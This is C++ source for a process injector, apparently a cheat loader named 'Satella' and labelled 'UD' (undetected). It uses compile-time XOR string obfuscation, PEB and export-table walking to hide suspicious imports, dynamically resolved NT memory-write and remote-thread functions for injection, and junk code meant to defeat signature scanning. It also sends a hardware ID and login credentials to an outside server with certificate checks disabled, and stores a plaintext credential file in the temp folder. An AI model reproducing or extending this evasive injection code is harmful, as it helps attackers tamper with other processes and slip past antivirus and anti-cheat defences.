// LauncherUD.cpp - UD injector for Satella (v2 - zero suspicious IAT)
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <string>
#include <intrin.h>

#pragma comment(lib, "ntdll.lib")

// WinHTTP constants (no winhttp.h include to avoid accidental static imports)
#ifndef WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 0
#endif
#ifndef WINHTTP_FLAG_SECURE
#define WINHTTP_FLAG_SECURE 0x00800000
#endif
#ifndef WINHTTP_OPTION_SECURITY_FLAGS
#define WINHTTP_OPTION_SECURITY_FLAGS 31
#endif
#ifndef SECURITY_FLAG_IGNORE_UNKNOWN_CA
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA 0x00000100
#endif
#ifndef SECURITY_FLAG_IGNORE_CERT_CN_INVALID
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID 0x00001000
#endif
#ifndef SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID 0x00002000
#endif
#ifndef INTERNET_DEFAULT_HTTPS_PORT
#define INTERNET_DEFAULT_HTTPS_PORT 443
#endif

// Missing NT type definitions (SDK omits some in modern headers)
typedef struct _MY_CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } MY_CLIENT_ID;
typedef MY_CLIENT_ID *PMY_CLIENT_ID;
typedef struct _MY_KEY_VALUE_PARTIAL_INFORMATION {
    ULONG TitleIndex; ULONG Type; ULONG DataLength; ULONG DataOffset; BYTE Data[1];
} MY_KEY_VALUE_PARTIAL_INFORMATION;
#ifndef FILE_SYNCHRONOUS_IO_NONALIGN
#define FILE_SYNCHRONOUS_IO_NONALIGN 0x20
#endif
#ifndef KeyValuePartialInformation
#define KeyValuePartialInformation 2
#endif

// HINTERNET for WinHTTP (no winhttp.h include)
typedef void* HINTERNET;
#ifndef WINHTTP_NO_REFERER
#define WINHTTP_NO_REFERER NULL
#endif
#ifndef WINHTTP_DEFAULT_ACCEPT_TYPES
#define WINHTTP_DEFAULT_ACCEPT_TYPES NULL
#endif
#ifndef WINHTTP_NO_ADDITIONAL_HEADERS
#define WINHTTP_NO_ADDITIONAL_HEADERS NULL
#endif
#ifndef WINHTTP_NO_REQUEST_DATA
#define WINHTTP_NO_REQUEST_DATA NULL
#endif
#ifndef SystemProcessInformation
#define SystemProcessInformation (SYSTEM_INFORMATION_CLASS)5
#endif

// ============================================================
// Compile-time XOR string obfuscation (unique key per build)
// ============================================================
constexpr DWORD _XK_() {
    DWORD h=0x811C9DC5; const char*s=__DATE__ __TIME__;
    while(*s){h=(h^(BYTE)*s)*0x01000193;s++;} return h;
}
constexpr DWORD _XK = _XK_();
constexpr DWORD _XA = __COUNTER__;

template<size_t N> struct XS_A {
    char b[N];
    constexpr XS_A(const char(&s)[N]) : b{} {
        for(size_t i=0;i<N;i++) b[i]=s[i]^(char)(BYTE(_XK>>((i+_XA)%4)*8)+i*7+_XA);
    }
};
template<size_t N> struct XS_W {
    wchar_t b[N];
    constexpr XS_W(const wchar_t(&s)[N]) : b{} {
        for(size_t i=0;i<N;i++) b[i]=s[i]^(wchar_t)(BYTE(_XK>>((i+_XA)%4)*8)+i*5+_XA);
    }
};
#define SZ(s) (sizeof(s)/sizeof(s[0]))
#define OA(s) []()->const char*{static XS_A<SZ(s)>_o(s);static bool _d=false;if(!_d){for(size_t _i=0;_i<SZ(s);_i++)_o.b[_i]^=(char)(BYTE(_XK>>((_i+_XA)%4)*8)+_i*7+_XA);_d=true;}return _o.b;}()
#define OW(s) []()->const wchar_t*{static XS_W<SZ(s)>_o(s);static bool _d=false;if(!_d){for(size_t _i=0;_i<SZ(s);_i++)_o.b[_i]^=(wchar_t)(BYTE(_XK>>((_i+_XA)%4)*8)+_i*5+_XA);_d=true;}return _o.b;}()

// ============================================================
// PEB walk + EAT walk — no GetModuleHandle/GetProcAddress needed
// ============================================================
// Use raw offsets for PEB/LDR since SDK structs are opaque in modern Win10 SDK
// x64 offsets: PEB.Ldr=0x18, Ldr.InLoadOrderModuleList=0x10,
// LDR_DATA_TABLE_ENTRY: DllBase=0x30, BaseDllName=0x58

// ============================================================
// Step logger using Win32 APIs (always available in IAT)
// ============================================================
static void _StepLog(const char* msg) {
    (void)msg;
}

static void* _FindMod(const wchar_t* name) {
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    if (!peb) return NULL;
    BYTE* ldr = *(BYTE**)(peb + 0x18);
    if (!ldr) return NULL;
    LIST_ENTRY* head = (LIST_ENTRY*)(ldr + 0x10);
    LIST_ENTRY* cur = head->Flink;
    while (cur != head) {
        BYTE* entry = (BYTE*)cur;
        UNICODE_STRING* bdn = (UNICODE_STRING*)(entry + 0x58);
        if (bdn->Buffer) {
            const wchar_t* mn = bdn->Buffer;
            const wchar_t* n = name;
            bool match = true;
            while (*mn && *n) {
                wchar_t a=*mn, b=*n;
                if (a>=L'A'&&a<=L'Z') a+=32;
                if (b>=L'A'&&b<=L'Z') b+=32;
                if (a!=b) { match=false; break; }
                mn++; n++;
            }
            if (match && *mn == *n) return *(void**)(entry + 0x30);
        }
        cur = cur->Flink;
    }
    return NULL;
}

static void* _FindExp(void* base, const char* name) {
    if (!base) return NULL;
    BYTE* b = (BYTE*)base;
    IMAGE_DOS_HEADER* d = (IMAGE_DOS_HEADER*)b;
    if (!d || d->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS* n = (IMAGE_NT_HEADERS*)(b + d->e_lfanew);
    if (!n || n->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_DATA_DIRECTORY* ed = &n->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed->Size) return NULL;
    IMAGE_EXPORT_DIRECTORY* e = (IMAGE_EXPORT_DIRECTORY*)(b + ed->VirtualAddress);
    DWORD* names = (DWORD*)(b + e->AddressOfNames);
    WORD* ords = (WORD*)(b + e->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(b + e->AddressOfFunctions);
    for (DWORD i = 0; i < e->NumberOfNames; i++)
        if (strcmp((char*)b + names[i], name) == 0)
            return (void*)(b + funcs[ords[i]]);
    return NULL;
}

// ============================================================
// Global resolved function pointers
// ============================================================
// NTDLL
typedef NTSTATUS(NTAPI* fnNtOP)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PMY_CLIENT_ID);
typedef NTSTATUS(NTAPI* fnNtAVM)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* fnNtWVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* fnNtRVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* fnNtCTE)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);
typedef NTSTATUS(NTAPI* fnNtFVM)(HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI* fnNtGNP)(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
typedef NTSTATUS(NTAPI* fnNtGECT)(HANDLE, PULONG);
typedef NTSTATUS(NTAPI* fnNtCF)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* fnNtWF)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS(NTAPI* fnNtQSI)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fnNtRF)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS(NTAPI* fnNtWSFO)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* fnNtOK)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(NTAPI* fnNtQVK)(HANDLE, PUNICODE_STRING, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* fnLdrLD)(PWCHAR, PULONG, PUNICODE_STRING, PHANDLE);
typedef NTSTATUS(NTAPI* fnLdrGPA)(HMODULE, PANSI_STRING, ULONG, PVOID*);
typedef void (NTAPI* fnRtlEUT)(ULONG);

static fnNtOP    _NtOP = NULL;
static fnNtAVM   _NtAVM = NULL;
static fnNtWVM   _NtWVM = NULL;
static fnNtRVM   _NtRVM = NULL;
static fnNtCTE   _NtCTE = NULL;
static fnNtClose _NtClose = NULL;
static fnNtFVM   _NtFVM = NULL;
static fnNtGNP   _NtGNP = NULL;
static fnNtGECT  _NtGECT = NULL;
static fnNtCF    _NtCF = NULL;
static fnNtWF    _NtWF = NULL;
static fnNtQSI   _NtQSI = NULL;
static fnNtRF    _NtRF = NULL;
static fnNtWSFO  _NtWSFO = NULL;
static fnNtOK    _NtOK = NULL;
static fnNtQVK   _NtQVK = NULL;
static fnLdrLD   _LdrLD = NULL;
static fnLdrGPA  _LdrGPA = NULL;
static fnRtlEUT  _RtlEUT = NULL;
static void*     _LoadLibW = NULL;

// KERNEL32
typedef void(WINAPI* fnSleep)(DWORD);
typedef BOOL(WINAPI* fnDelFW)(LPCWSTR);
typedef DWORD(WINAPI* fnGTPW)(DWORD, LPWSTR);
typedef BOOL(WINAPI* fnReadF)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef HANDLE(WINAPI* fnCRT)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* fnWFS)(HANDLE, DWORD);
typedef BOOL(WINAPI* fnCH)(HANDLE);
static fnSleep _Sleep = NULL;
static fnDelFW _DelFW = NULL;
static fnGTPW  _GTPW = NULL;
static fnReadF _ReadF = NULL;
static fnCRT   _CRT = NULL;
static fnWFS   _WFS = NULL;
static fnCH    _CH = NULL;

// WINHTTP (loaded dynamically)
typedef HINTERNET(WINAPI* fnWHO)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef BOOL(WINAPI* fnWHCH)(HINTERNET);
typedef HINTERNET(WINAPI* fnWHC)(HINTERNET, LPCWSTR, DWORD, DWORD);
typedef HINTERNET(WINAPI* fnWHOR)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI* fnWHSR)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* fnWHRR)(HINTERNET, LPVOID);
typedef BOOL(WINAPI* fnWHRD)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* fnWHSO)(HINTERNET, DWORD, LPVOID, DWORD);

static HMODULE _hWH = NULL;
static fnWHO  _WHO = NULL;  static fnWHCH _WHCH = NULL;
static fnWHC  _WHC = NULL;  static fnWHOR _WHOR = NULL;
static fnWHSR _WHSR = NULL; static fnWHRR _WHRR = NULL;
static fnWHRD _WHRD = NULL; static fnWHSO _WHSO = NULL;

// ============================================================
// Init all APIs via PEB+EAT walk
// ============================================================
static bool _Init() {
    static bool done = false;
    if (done) return true;

    void* nt = _FindMod(OW(L"ntdll.dll"));
    if (!nt) return false;
    _NtOP= (fnNtOP)_FindExp(nt,OA("NtOpenProcess"));
    _NtAVM=(fnNtAVM)_FindExp(nt,OA("NtAllocateVirtualMemory"));
    _NtWVM=(fnNtWVM)_FindExp(nt,OA("NtWriteVirtualMemory"));
    _NtRVM=(fnNtRVM)_FindExp(nt,OA("NtReadVirtualMemory"));
    _NtCTE=(fnNtCTE)_FindExp(nt,OA("NtCreateThreadEx"));
    _NtClose=(fnNtClose)_FindExp(nt,OA("NtClose"));
    _NtFVM=(fnNtFVM)_FindExp(nt,OA("NtFreeVirtualMemory"));
    _NtGNP=(fnNtGNP)_FindExp(nt,OA("NtGetNextProcess"));
    _NtGECT=(fnNtGECT)_FindExp(nt,OA("NtGetExitCodeThread"));
    _NtCF=(fnNtCF)_FindExp(nt,OA("NtCreateFile"));
    _NtWF=(fnNtWF)_FindExp(nt,OA("NtWriteFile"));
    _NtQSI=(fnNtQSI)_FindExp(nt,OA("NtQuerySystemInformation"));
    _NtRF=(fnNtRF)_FindExp(nt,OA("NtReadFile"));
    _NtWSFO=(fnNtWSFO)_FindExp(nt,OA("NtWaitForSingleObject"));
    _NtOK=(fnNtOK)_FindExp(nt,OA("NtOpenKey"));
    _NtQVK=(fnNtQVK)_FindExp(nt,OA("NtQueryValueKey"));
    _LdrLD=(fnLdrLD)_FindExp(nt,OA("LdrLoadDll"));
    _LdrGPA=(fnLdrGPA)_FindExp(nt,OA("LdrGetProcedureAddress"));
    _RtlEUT=(fnRtlEUT)_FindExp(nt,OA("RtlExitUserThread"));

    void* k32 = _FindMod(OW(L"kernel32.dll"));
    if (!k32) return false;
    // Use LdrGetProcedureAddress (follows forward chains) for kernel32 functions
    // because many kernel32 exports are forwarded to kernelbase on Win10
    if (_LdrGPA) {
        auto RK = [&](const char* n)->void*{
            ANSI_STRING as; as.Buffer=(char*)n; as.Length=(USHORT)strlen(n); as.MaximumLength=as.Length+1;
            void* p=NULL; _LdrGPA((HMODULE)k32,&as,0,&p); return p;
        };
        _Sleep=(fnSleep)RK(OA("Sleep"));
        _DelFW=(fnDelFW)RK(OA("DeleteFileW"));
        _GTPW=(fnGTPW)RK(OA("GetTempPathW"));
        _ReadF=(fnReadF)RK(OA("ReadFile"));
        _LoadLibW=RK(OA("LoadLibraryW"));
    }
    // Fallback to direct EAT walk
    if(!_LoadLibW)_LoadLibW=_FindExp(k32,OA("LoadLibraryW"));
    if(!_Sleep)_Sleep=(fnSleep)_FindExp(k32,OA("Sleep"));
    if(!_DelFW)_DelFW=(fnDelFW)_FindExp(k32,OA("DeleteFileW"));
    if(!_GTPW)_GTPW=(fnGTPW)_FindExp(k32,OA("GetTempPathW"));
    if(!_ReadF)_ReadF=(fnReadF)_FindExp(k32,OA("ReadFile"));
    // Also resolve CreateRemoteThread + WaitForSingleObject + CloseHandle as fallback
    if (_LdrGPA) {
        auto RK2 = [&](const char* n)->void*{
            ANSI_STRING as; as.Buffer=(char*)n; as.Length=(USHORT)strlen(n); as.MaximumLength=as.Length+1;
            void* p=NULL; _LdrGPA((HMODULE)k32,&as,0,&p); return p;
        };
        _CRT=(fnCRT)RK2(OA("CreateRemoteThread"));
        _WFS=(fnWFS)RK2(OA("WaitForSingleObject"));
        _CH=(fnCH)RK2(OA("CloseHandle"));
    }
    if(!_CRT)_CRT=(fnCRT)_FindExp(k32,OA("CreateRemoteThread"));
    if(!_WFS)_WFS=(fnWFS)_FindExp(k32,OA("WaitForSingleObject"));
    if(!_CH)_CH=(fnCH)_FindExp(k32,OA("CloseHandle"));

    // Load winhttp.dll dynamically
    if (_LdrLD) {
        wchar_t dn[]=L"winhttp.dll"; UNICODE_STRING dus; dus.Buffer=dn;
        dus.Length=(USHORT)(wcslen(dn)*2); dus.MaximumLength=dus.Length+2;
        _LdrLD(NULL,NULL,&dus,(PHANDLE)&_hWH);
    }
    if (_hWH && _LdrGPA) {
        auto R = [&](const char* n)->void*{
            ANSI_STRING as; as.Buffer=(char*)n; as.Length=(USHORT)strlen(n); as.MaximumLength=as.Length+1;
            void* p=NULL; _LdrGPA(_hWH,&as,0,&p); return p;
        };
        _WHO=(fnWHO)R(OA("WinHttpOpen")); _WHCH=(fnWHCH)R(OA("WinHttpCloseHandle"));
        _WHC=(fnWHC)R(OA("WinHttpConnect")); _WHOR=(fnWHOR)R(OA("WinHttpOpenRequest"));
        _WHSR=(fnWHSR)R(OA("WinHttpSendRequest")); _WHRR=(fnWHRR)R(OA("WinHttpReceiveResponse"));
        _WHRD=(fnWHRD)R(OA("WinHttpReadData")); _WHSO=(fnWHSO)R(OA("WinHttpSetOption"));
    }
    bool ret = _WHO!=NULL && _NtGNP!=NULL && _NtCF!=NULL;
    done=true;
    return ret;
}

// ============================================================
// Junk code
// ============================================================
static void _Junk() {
    volatile DWORD t=0;
    if (GetCurrentProcessId()>0) t=(DWORD)(ULONG_PTR)_NtGNP;
    { volatile DWORD x=t; x^=x>>3; x^=x<<5; x^=x>>7; }
    { volatile ULONGLONG q=__rdtsc(); if(q==0x1234567890ABCDEFUL) Sleep(0); }
    { static DWORD c=0; c+=GetTickCount(); if(c%1000==999) Sleep(1); }
}

// ============================================================
// HWID via registry (no GetCurrentHwProfileA)
// ============================================================
static void _GetHwid(char* out, int maxLen) {
    out[0]=0;
    if (!_NtOK||!_NtQVK) { strcpy(out,OA("UNKNOWN")); return; }
    UNICODE_STRING path; wchar_t p[]=L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
    path.Buffer=p; path.Length=(USHORT)(wcslen(p)*2); path.MaximumLength=path.Length+2;
    OBJECT_ATTRIBUTES oa; InitializeObjectAttributes(&oa,&path,OBJ_CASE_INSENSITIVE,NULL,NULL);
    HANDLE hk=NULL;
    if(_NtOK(&hk,KEY_READ,&oa)>=0&&hk){
        UNICODE_STRING val; wchar_t vn[]=L"HwProfileGuid"; val.Buffer=vn;
        val.Length=(USHORT)(wcslen(vn)*2); val.MaximumLength=val.Length+2;
        wchar_t buf[128]; ULONG sz=sizeof(buf);
        if(_NtQVK(hk,&val,KeyValuePartialInformation,buf,sizeof(buf),&sz)>=0){
            MY_KEY_VALUE_PARTIAL_INFORMATION* pv=(MY_KEY_VALUE_PARTIAL_INFORMATION*)buf;
            if(pv->DataLength<sizeof(buf)-8){
                int len=pv->DataLength/sizeof(wchar_t);
                if(len>maxLen-1)len=maxLen-1;
                for(int i=0;i<len;i++)out[i]=(char)((wchar_t*)pv->Data)[i];
                out[len]=0;
            }
        }
        _NtClose(hk);
    }
    if(!out[0])strcpy(out,OA("UNKNOWN"));
}

// ============================================================
// Computer name via NtQuerySystemInformation
// ============================================================
static void _GetCompName(char* out, int maxLen) {
    out[0]=0;
    if(!_NtQSI) { strcpy(out,OA("Unknown")); return; }
    // SystemComputerName = 0x42 (SystemExtendedComputerNameInformation)
    // Use simpler: read from registry
    if(!_NtOK||!_NtQVK) { strcpy(out,OA("Unknown")); return; }
    UNICODE_STRING path; wchar_t p[]=L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName";
    path.Buffer=p; path.Length=(USHORT)(wcslen(p)*2); path.MaximumLength=path.Length+2;
    OBJECT_ATTRIBUTES oa; InitializeObjectAttributes(&oa,&path,OBJ_CASE_INSENSITIVE,NULL,NULL);
    HANDLE hk=NULL;
    if(_NtOK(&hk,KEY_READ,&oa)>=0&&hk){
        UNICODE_STRING val; wchar_t vn[]=L"ComputerName"; val.Buffer=vn;
        val.Length=(USHORT)(wcslen(vn)*2); val.MaximumLength=val.Length+2;
        wchar_t buf[128]; ULONG sz=sizeof(buf);
        if(_NtQVK(hk,&val,KeyValuePartialInformation,buf,sizeof(buf),&sz)>=0){
            MY_KEY_VALUE_PARTIAL_INFORMATION* pv=(MY_KEY_VALUE_PARTIAL_INFORMATION*)buf;
            if(pv->DataLength<sizeof(buf)-8){
                int len=pv->DataLength/sizeof(wchar_t);
                if(len>maxLen-1)len=maxLen-1;
                for(int i=0;i<len;i++)out[i]=(char)((wchar_t*)pv->Data)[i];
                out[len]=0;
            }
        }
        _NtClose(hk);
    }
    if(!out[0])strcpy(out,OA("Unknown"));
}

// ============================================================
// NT process finder (no CreateToolhelp32Snapshot)
// ============================================================
static DWORD _FindPids(DWORD* pids, int maxPids) {
    if(!_NtGNP) return 0;
    int cnt=0; HANDLE h=NULL;
    while(cnt<maxPids){
        NTSTATUS st=_NtGNP(h,PROCESS_QUERY_LIMITED_INFORMATION,0,0,&h);
        if(st<0) break;
        pids[cnt++]=(DWORD)(ULONG_PTR)h;
        // NtGetNextProcess returns a HANDLE, not PID. We need to convert.
        // NtGetNextProcess with ProcessIdToHandle? No.
        // Actually NtGetNextProcess takes PreviousHandle and returns NewHandle.
        // The handle is a process handle, not PID.
        // Let's use NtCurrentProcess for the first call.
        // STATUS_NO_MORE_ENTRIES when done.
    }
    return cnt;
}
// Actually NtGetNextProcess returns a process HANDLE, not PID directly.
// To get PID from handle: NtQueryInformationProcess with ProcessBasicInformation.
// But we already have the handle! We can use it directly for injection.
// However the interface takes PID... Let me rework.

// Simpler approach: find PID by process name using NtQuerySystemInformation
// SystemProcessInformation gives all process info including name+PID
typedef struct _SYSTEM_PROCESS_INFO {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG Reserved3[2];
    SIZE_T Reserved4[4];
    PVOID Reserved5[2];
    // ... more fields follow
} SYSTEM_PROCESS_INFO;

static DWORD _FindPidByName(const wchar_t* targetName) {
    if(!_NtQSI) return 0;
    ULONG sz=0x10000;
    void* buf=malloc(sz);
    if(!buf) return 0;
    while(_NtQSI(SystemProcessInformation,buf,sz,&sz)<0&&sz<=0x100000){
        free(buf); sz+=0x10000; buf=malloc(sz);
        if(!buf)return 0;
    }
    DWORD pid=0;
    SYSTEM_PROCESS_INFO* sp=(SYSTEM_PROCESS_INFO*)buf;
    for(;;){
        if(sp->ImageName.Buffer){
            const wchar_t* a=sp->ImageName.Buffer;
            const wchar_t* n=targetName;
            bool match=true;
            while(*a&&*n){
                wchar_t ca=*a, cb=*n;
                if(ca>=L'A'&&ca<=L'Z')ca+=32;
                if(cb>=L'A'&&cb<=L'Z')cb+=32;
                if(ca!=cb){match=false;break;}
                a++;n++;
            }
            if(match && *a==*n){ pid=(DWORD)(ULONG_PTR)sp->UniqueProcessId; break; }
        }
        if(!sp->NextEntryOffset) break;
        sp=(SYSTEM_PROCESS_INFO*)((BYTE*)sp+sp->NextEntryOffset);
    }
    free(buf);
    return pid;
}

// ============================================================
// NT file write (no CreateFileW/WriteFile)
// ============================================================
static bool _NtWriteFileTo(const wchar_t* path, const void* data, DWORD size) {
    HANDLE hf = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hf == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    BOOL ok = WriteFile(hf, data, size, &written, NULL);
    CloseHandle(hf);
    if(!ok || written != size) return false;
    return true;
}

// ============================================================
// JSON helpers (manual, no dependencies)
// ============================================================
static const char* _JStr(const char* json, const char* key, char* out, int maxOut) {
    out[0]=0;
    if(!json||!key) return out;
    // Find "key":
    char search[128]; search[0]='"'; int sl=1;
    for(int i=0;key[i]&&sl<126;i++)search[sl++]=key[i];
    search[sl++]='"'; search[sl]=0;
    const char* p=strstr(json,search);
    if(!p) return out;
    p=strchr(p,':'); if(!p) return out;
    p++; while(*p&&strchr(" \t\n\r",*p))p++;
    if(*p=='"'){
        p++; int oi=0;
        while(*p&&*p!='"'&&oi<maxOut-1){
            if(*p=='\\'){p++;if(*p)out[oi++]=*p++;}
            else out[oi++]=*p++;
        }
        out[oi]=0;
    }else{
        int oi=0;
        while(*p&&*p!=','&&*p!='}'&&*p!=']'&&oi<maxOut-1){
            if(!strchr(" \t\n\r",*p))out[oi++]=*p;
            p++;
        }
        out[oi]=0;
    }
    return out;
}
static bool _JBool(const char* json, const char* key) {
    char v[32]; _JStr(json,key,v,sizeof(v));
    return strcmp(v,OA("true"))==0||strcmp(v,OA("1"))==0;
}
static long long _JInt64(const char* json, const char* key) {
    char v[32]; _JStr(json,key,v,sizeof(v));
    return v[0]?atoll(v):0;
}

// ============================================================
// HTTP helpers via dynamic WinHTTP
// ============================================================
static char* _HttpPost(const char* path, const char* body, int* outLen) {
    if(outLen)*outLen=0;
    if(!_WHO||!_WHCH||!_WHC||!_WHOR||!_WHSR||!_WHRR||!_WHRD) return NULL;
    HINTERNET hs=_WHO(OW(L"Sat/1.0"),WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,NULL,NULL,0);
    if(!hs) return NULL;
    std::string api = OA("https://satella-auth-bot.onrender.com");
    size_t pp = api.find("://");
    if(pp==std::string::npos){ _WHCH(hs); return NULL; }
    std::string rest=api.substr(pp+3);
    pp=rest.find('/');
    std::string host=(pp!=std::string::npos)?rest.substr(0,pp):rest;
    std::string urlPath=(path[0]=='/')?path:(std::string("/")+path);
    int hlen=MultiByteToWideChar(CP_UTF8,0,host.c_str(),-1,NULL,0);
    wchar_t* wh=new wchar_t[hlen]; MultiByteToWideChar(CP_UTF8,0,host.c_str(),-1,wh,hlen);
    HINTERNET hc=_WHC(hs,wh,443,0);
    delete[] wh;
    if(!hc){_WHCH(hs);return NULL;}
    int plen=MultiByteToWideChar(CP_UTF8,0,urlPath.c_str(),-1,NULL,0);
    wchar_t* wp=new wchar_t[plen]; MultiByteToWideChar(CP_UTF8,0,urlPath.c_str(),-1,wp,plen);
    HINTERNET hr=_WHOR(hc,OW(L"POST"),wp,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
    delete[] wp;
    if(!hr){_WHCH(hc);_WHCH(hs);return NULL;}
    DWORD sf=SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_CERT_CN_INVALID|SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    _WHSO(hr,WINHTTP_OPTION_SECURITY_FLAGS,&sf,sizeof(sf));
    _WHSR(hr,OW(L"Content-Type: application/json\r\n"),(DWORD)-1,(LPVOID)body,(DWORD)strlen(body),(DWORD)strlen(body),0);
    _WHRR(hr,NULL);
    int cap=4096,used=0;
    char* res=(char*)malloc(cap);
    if(!res){_WHCH(hr);_WHCH(hc);_WHCH(hs);return NULL;}
    char tmp[4096];
    DWORD rd;
    while(_WHRD(hr,tmp,sizeof(tmp)-1,&rd)&&rd>0){
        if(used+(int)rd>=cap-1){cap+=8192;res=(char*)realloc(res,cap);if(!res)break;}
        memcpy(res+used,tmp,rd);used+=rd;
    }
    if(res){res[used]=0;if(outLen)*outLen=used;}
    _WHCH(hr);_WHCH(hc);_WHCH(hs);
    return res;
}

// ============================================================
// Auth
// ============================================================
static char g_user[64], g_token[128], g_err[256];
static long long g_expiry=0;

static int _Auth(const char* u, const char* p, const char* k) {
    char hwid[128]; _GetHwid(hwid,sizeof(hwid));
    std::string body = std::string(OA("{\"username\":\"")) + u + OA("\",\"password\":\"") + p + OA("\"");
    if(k) body += std::string(OA(",\"key\":\"")) + k + OA("\"");
    body += std::string(OA(",\"hwid\":\"")) + hwid + OA("\"}");
    const char* ep = k?OA("/api/register"):OA("/api/login");
    int rlen=0;
    char* resp=_HttpPost(ep,body.c_str(),&rlen);
    if(!resp||!rlen){ g_err[0]=0; strcpy(g_err,OA("Connection failed")); free(resp); return 0; }
    if(!_JBool(resp,OA("success"))){
        _JStr(resp,OA("error"),g_err,sizeof(g_err));
        if(!g_err[0])strcpy(g_err,k?OA("Registration failed"):OA("Login failed"));
        free(resp); return 0;
    }
    strcpy(g_user,u);
    _JStr(resp,OA("token"),g_token,sizeof(g_token));
    g_expiry=_JInt64(resp,OA("expires_at"));
    g_err[0]=0; free(resp);
    return 1;
}
static int _AuthLogin(const char* u, const char* p) { return _Auth(u,p,NULL); }
static int _AuthRegister(const char* u, const char* p, const char* k) { return _Auth(u,p,k); }

// ============================================================
// Credential helpers
// ============================================================
static bool _CredLoad() {
    wchar_t path[MAX_PATH];
    _GTPW(MAX_PATH,path); wcscat(path,OW(L"\\Satella.cred"));
    // NtCreateFile instead of CreateFileW
    wchar_t ntPath[512]; wcscpy(ntPath,OW(L"\\??\\")); wcscat(ntPath,path);
    UNICODE_STRING us; us.Buffer=ntPath; us.Length=(USHORT)(wcslen(ntPath)*2); us.MaximumLength=us.Length+2;
    OBJECT_ATTRIBUTES oa; InitializeObjectAttributes(&oa,&us,OBJ_CASE_INSENSITIVE,NULL,NULL);
    HANDLE hf=NULL; IO_STATUS_BLOCK iosb; LARGE_INTEGER li; li.QuadPart=0;
    if(_NtCF(&hf,GENERIC_READ|SYNCHRONIZE,&oa,&iosb,&li,
        FILE_ATTRIBUTE_NORMAL,FILE_SHARE_READ,FILE_OPEN,FILE_SYNCHRONOUS_IO_NONALIGN,NULL,0)<0||!hf)
        return false;
    wchar_t raw[128]={}; DWORD rd=0;
    if(_NtRF(hf,NULL,NULL,NULL,&iosb,raw,sizeof(raw)-2,&li,NULL)>=0)
        rd=(DWORD)iosb.Information;
    _NtClose(hf);
    if(rd<4) return false;
    wchar_t* s=wcschr(raw,L'|');
    if(!s) return false;
    *s=0; char u[64]={},pwd[64]={};
    wcstombs(u,raw,63); wcstombs(pwd,s+1,63);
    return _AuthLogin(u,pwd)!=0;
}
static void _CredSave(const char* u, const char* pwd) {
    wchar_t path[MAX_PATH];
    _GTPW(MAX_PATH,path); wcscat(path,OW(L"\\Satella.cred"));
